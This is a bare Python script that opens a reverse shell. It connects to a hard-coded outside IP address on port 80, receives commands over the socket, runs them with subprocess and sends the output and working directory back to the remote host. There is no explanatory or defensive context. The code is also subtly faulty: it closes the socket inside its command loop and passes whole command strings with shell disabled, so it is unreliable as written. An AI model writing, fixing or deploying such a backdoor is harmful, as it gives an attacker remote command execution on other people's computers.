import os
import socket
import subprocess


socket = socket.socket()
host = '69.121.232.114'
port = 80


socket.connect((host, port))

while True:
    data = socket.recv(1024)
    if data[:2].decode("utf-8") == 'cd':
        os.chdir(data[3:].decode("utf-8"))

    if len(data) > 0:
        command = subprocess.Popen(data[:].decode("utf-8"), shell = False,
                  stdin = subprocess.PIPE, stdout = subprocess.PIPE, stderr = subprocess.PIPE)

        output_bytes = command.stdout.read()
        print_text = str(output_bytes, "utf-8")


        socket.send(str.encode(print_text + str(os.getcwd()) + '> '))
        print(print_text)

    socket.close()
